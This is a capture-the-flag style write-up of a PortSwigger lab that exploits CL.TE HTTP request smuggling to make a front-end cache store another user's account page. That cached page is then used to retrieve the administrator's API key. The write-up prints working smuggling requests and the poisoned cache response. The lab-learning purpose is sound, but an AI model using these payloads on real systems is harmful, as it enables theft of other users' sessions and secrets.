# Exploiting HTTP request smuggling to perform web cache deception

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception), you'll learn: Exploiting HTTP request smuggling to perform web cache deception! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.

To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.

You can log in to your own account using the following credentials: `wiener:peter`

> Note:
>  
> The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224200639.png)

In here, we can try to identify the web application is vulnerable to HTTP request smuggling.

First, we need to determine which type of HTTP request smuggling. Like CL.TE (Front-end uses `Content-Length` header, back-end uses `Transfer-Encoding` header) or TE.CL (Front-end uses `Transfer-Encoding` header, back-end uses `Content-Length` header).

- CL.TE:

**Attack request:**
```http
POST / HTTP/1.1
Host: 0a7b0027039cfac0c0ef869700c10027.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404pls HTTP/1.1
X-Foo: x
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224200927.png)

**Normal request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224200951.png)

As you can see, our normal request's response returns a 404 status code, which means the web application is vulnerable to CL.TE HTTP request smuggling.

Then, we can move on to the next bigger exploit chain.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224201213.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224201225.png)

As you can see, both `/resources/js/tracking.js` and `/resources/images/blog.svg` has implemented web cache.

That being said, we can try to **poison those cache later**.

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224201353.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224201410.png)

After we logged in, we can view our API key.

Armed with above information, we can try to **leverage HTTP request smuggling to perform web cache deception** in order to view victim's API key!

> **What is the difference between web cache poisoning and web cache deception?**
> 
> - In **web cache poisoning**, the attacker causes the application to store some **malicious content** in the cache, and **this content is served from the cache to other application users**.
> - In **web cache deception**, the attacker causes the application to store some **sensitive content** belonging to another user in the cache, and **the attacker then retrieves this content from the cache.**

**To do so, we can first smuggle a request that returns some sensitive user-specific content:**
```http
POST / HTTP/1.1
Host: 0a7b0027039cfac0c0ef869700c10027.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Foo: x
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224201813.png)

The next request from another user that is forwarded to the back-end server will be appended to the smuggled request, including session cookies and other headers. For example:

```http
GET /my-account HTTP/1.1
X-Foo: xGET /resources/images/blog.svg HTTP/1.1
Host: 0a7b0027039cfac0c0ef869700c10027.web-security-academy.net
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
```

The back-end server responds to this request in the normal way. The URL in the request is for the user's profile and the request is processed in the context of the victim user's session. The front-end server caches this response against what it believes is the URL in the second request, which is `/resources/images/blog.svg`:

```http
GET /resources/images/blog.svg HTTP/1.1
Host: 0a7b0027039cfac0c0ef869700c10027.web-security-academy.net

HTTP/1.1 200 Ok
[...]
<div>Your API Key is: [...]</div>
[...]
```

We can then visits the static URL and receives the sensitive content that is returned from the cache.

An important caveat here is that **we doesn't know the URL against which the sensitive content will be cached**, since this will be whatever URL the victim user happened to be requesting when the smuggled request took effect. **We may need to fetch a large number of static URLs to discover the captured content**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224202507.png)

We found `administrator`'s API key in `/resources/js/tracking.js`!

Let's submit that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224202536.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-17/images/Pasted%20image%2020230224202541.png)

# What we've learned:

1. Exploiting HTTP request smuggling to perform web cache deception